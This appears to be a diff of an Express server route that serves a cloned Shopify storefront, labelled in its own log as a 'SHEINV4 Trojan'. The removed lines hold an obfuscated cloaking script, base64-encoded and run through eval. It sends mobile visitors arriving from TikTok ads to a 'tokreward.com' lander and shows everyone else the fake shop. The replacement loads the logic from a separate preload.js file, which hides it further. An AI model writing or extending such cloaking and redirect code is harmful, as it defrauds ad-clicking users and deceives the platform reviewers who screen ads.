@@ -3615,15 +3615,6 @@ Item added to your cart
 //         const isTok = /musical_ly|Bytedance|BytedanceWebview|ByteLocale/i.test(navigator.userAgent); && !isTok
 app.get('/shop', extractSubdomain, (req, res, next) => {
     const slug = req.subdomain;
-    const lander = `https://tokreward.com/trshein.html?slug=${slug}`;
-    const cloak = `
-        const utm = new URLSearchParams(window.location.search);
-        const ttclid = utm.get("ttclid");
-        const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        console.log(ttclid, mobile);
-        if (ttclid && mobile) { window.location.href = "${lander}"; } else { }
-    `;
-    const payload = base64Encode(cloak);
     console.log(`Served SHEINV4 Trojan (${slug})`);
     const trojanHTML = `
    		<html class="js" lang="en" style="--header-height: 65px;"><head>
@@ -3634,10 +3625,7 @@ app.get('/shop', extractSubdomain, (req, res, next) => {
     <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-eval';">
     <link rel="canonical" href="https://bf9fa1-7d.myshopify.com/"><link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin=""><title>${slug}</title>
     <meta name="description" content="${slug}">
-    <script>
-          const cdnPreload = atob('${payload}');
-          eval(cdnPreload);
-        </script>
+    <script src="/cdn/preload.js"></script>
     <script type="text/javascript" async="" src="//bf9fa1-7d.myshopify.com/cdn/s/trekkie.storefront.6feac1db1e2c7d84269967dcaefdee0618af51f6.min.js"></script><script src="//bf9fa1-7d.myshopify.com/cdn/shop/t/1/assets/constants.js?v=132983761750457495441719145825" defer="defer"></script>
     <script src="//bf9fa1-7d.myshopify.com/cdn/shop/t/1/assets/pubsub.js?v=158357773527763999511719145825" defer="defer"></script>
     <script src="//bf9fa1-7d.myshopify.com/cdn/shop/t/1/assets/global.js?v=88558128918567037191719145825" defer="defer"></script><script src="//bf9fa1-7d.myshopify.com/cdn/shop/t/1/assets/animations.js?v=88693664871331136111719145824" defer="defer"></script><script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/88131174695/digital_wallets/dialog">
